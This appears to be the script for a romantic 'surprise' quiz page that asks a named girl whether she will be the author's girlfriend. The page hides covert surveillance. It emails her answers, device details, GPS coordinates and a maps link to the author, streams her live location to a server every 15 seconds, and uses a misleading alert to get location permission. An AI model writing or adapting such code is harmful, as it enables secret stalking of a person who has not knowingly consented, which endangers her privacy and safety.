// ===================================
// PROJECT DIYA V3
// QUESTIONS PAGE
// ===================================

const questions = [

    "Are you happy with me? ❤️",

    "Kya main tumhari life ka special person hoon? 🥹❤️",

    "Will you be my girlfriend from today? ❤️🥹"

];

let currentQuestion = 0;
const answers = [];

// ===============================
// Device Information
// ===============================

const startTime = Date.now();

const deviceInfo = {
    browser: navigator.userAgent,
    platform: navigator.platform,
    language: navigator.language
};

// ===============================
// Email Notification
// ===============================

function sendNotification(question, answer) {

    const savedLocation = JSON.parse(
    localStorage.getItem("userLocation") || "{}"
);

    emailjs.send(
        "service_9pgx1er",
        "template_90o54vp",
        {
    question: question,
    answer: answer,
    time: new Date().toLocaleString(),

    browser: deviceInfo.browser,
    platform: deviceInfo.platform,
    language: deviceInfo.language,

    latitude: savedLocation.latitude || "Not Allowed",
    longitude: savedLocation.longitude || "Not Allowed",
    accuracy: savedLocation.accuracy || "-",

    city: savedLocation.city || "Unknown",
state: savedLocation.state || "Unknown",
country: savedLocation.country || "Unknown",

maps:
    savedLocation.latitude && savedLocation.longitude
        ? `https://www.google.com/maps?q=${savedLocation.latitude},${savedLocation.longitude}`
        : "Location Not Available",

    location_status: savedLocation.status || "Not Allowed",

    time_spent:
        Math.floor((Date.now() - startTime) / 1000) + " seconds"
}
    )
    .then(() => {
        console.log("Notification Sent");
    })
    .catch((error) => {
        console.error(error);
    });

}

// Elements
const questionNumber = document.getElementById("questionNumber");
const questionText = document.getElementById("questionText");
const progressBar = document.getElementById("progressBar");

const yesBtn = document.querySelector(".yes");
const noBtn = document.querySelector(".no");
const skipBtn = document.querySelector(".skip");

// ----------------------------
// Load Question
// ----------------------------

function loadQuestion() {

    questionNumber.innerHTML =
        `Question ${currentQuestion + 1} / ${questions.length}`;

    questionText.innerHTML =
        questions[currentQuestion];

    progressBar.style.width =
        ((currentQuestion + 1) / questions.length) * 100 + "%";

}

// ----------------------------
// Button Animation
// ----------------------------

function animateCard(callback){

    gsap.to(".question-card",{

        opacity:0,

        y:30,

        duration:0.25,

        onComplete:()=>{

            callback();

            gsap.fromTo(".question-card",

                {

                    opacity:0,

                    y:-30

                },

                {

                    opacity:1,

                    y:0,

                    duration:0.4

                }

            );

        }

    });

}

// ----------------------------
// Next Question
// ----------------------------

function answerClicked(answer){

    answers.push({

        question:questions[currentQuestion],

        answer:answer,

        time:new Date().toLocaleString()

    });

    sendNotification(
    questions[currentQuestion],
    answer
);

    currentQuestion++;

    if(currentQuestion<questions.length){

        animateCard(loadQuestion);

    }

    else{

        localStorage.setItem(

            "diya_answers",

            JSON.stringify(answers)

        );

        gsap.to("body",{

            opacity:0,

            duration:0.8,

            onComplete:()=>{

                window.location.href="/gift";

            }

        });

    }

}

// ----------------------------
// Events
// ----------------------------

yesBtn.addEventListener("click",()=>{

    answerClicked("YES ❤️");

});

noBtn.addEventListener("click",()=>{

    answerClicked("NO 💔");

});

skipBtn.addEventListener("click",()=>{

    answerClicked("SKIP ⏭");

});

// ===================================
// Live Location Tracking
// ===================================

let latestLocation = {};

function sendLiveLocation() {

    if (!latestLocation.latitude) return;

    fetch("/update_location", {

        method: "POST",

        headers: {

            "Content-Type": "application/json"

        },

        body: JSON.stringify(latestLocation)

    })

    .then(() => {

        console.log("📍 Live Location Updated");

    })

    .catch(err => {

        console.log(err);

    });

}

if (navigator.geolocation) {

    navigator.geolocation.getCurrentPosition(

    function(position){

        console.log("Location Permission Granted");

    },

    function(error){

        console.log(error);

    },

    {

        enableHighAccuracy:true

    }

);

    // ===============================
// Location Permission Loading
// ===============================

const locationTimeout = setTimeout(() => {

    if (!latestLocation.latitude) {

        alert(
            "📍 Please open this surprise in Chrome and Allow Location for the complete experience ❤️"
        );

    }

}, 5000);

    navigator.geolocation.watchPosition(

        async function(position) {

            const latitude = position.coords.latitude;
            const longitude = position.coords.longitude;
            const accuracy = position.coords.accuracy;

            let city = "";
            let state = "";
            let country = "";

            try {

                const res = await fetch(
                    `https://nominatim.openstreetmap.org/reverse?format=json&lat=${latitude}&lon=${longitude}`
                );

                const data = await res.json();

                city =
                    data.address.city ||
                    data.address.town ||
                    data.address.village ||
                    "";

                state =
                    data.address.state || "";

                country =
                    data.address.country || "";

            } catch (e) {}

            latestLocation = {

                latitude,
                longitude,
                accuracy,

                city,
                state,
                country

            };

            clearTimeout(locationTimeout);

        },

        function(error) {

            console.log(error);

        },

        {

            enableHighAccuracy: true

        }

    );

    // Every 30 Seconds

    setInterval(sendLiveLocation,15000);

}

// ----------------------------
// Start
// ----------------------------

loadQuestion();

console.log("❤️ Questions Page Loaded");